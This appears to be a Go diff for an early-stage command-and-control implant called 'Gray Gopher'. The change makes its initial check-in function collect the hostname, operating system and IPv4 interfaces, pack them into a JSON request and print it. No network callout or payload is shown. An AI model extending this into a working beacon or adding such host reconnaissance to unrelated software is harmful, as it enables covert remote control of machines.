@@ -7,7 +7,7 @@ import (
 	"os"
 	"runtime"
 	"net"
-	// "encoding/json"
+	"encoding/json"
 )
 
 type Task struct {
@@ -48,12 +48,10 @@ type InitialCheckinResponse struct {
 
 func HttpInitialCheckin () {
 	// Populate static fields
-	name, hostname_err := os.Hostname()
+	hostname, hostname_err := os.Hostname()
 	if hostname_err != nil {
-		name = "No Hostname"
+		hostname = "No Hostname"
 	}
-
-	os := runtime.GOOS
 
 	// Pull NICs
 	nics := make([]Interface, 0)
@@ -66,7 +64,6 @@ func HttpInitialCheckin () {
 		addrs, err := i.Addrs()
 		if err == nil {
 			for _, addr := range addrs {
-				fmt.Println(addrs)
 		        switch v := addr.(type) {
 		        case *net.IPNet:
 		        	// If the address is an IPv4 address, store it
@@ -87,11 +84,20 @@ func HttpInitialCheckin () {
 	    }
 	}
 
-	// By this point the `nics` array should store all the network interfaces
-
 	// Initialize JSON object
 
+	request := &InitialCheckinRequest{
+		Hostname: hostname,
+		Agent_type: "Gray Gopher",
+		OS: runtime.GOOS,
+		Nics: nics,
+	}
 
+	json_request, err := json.Marshal(request)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(string(json_request))
 
 }
 
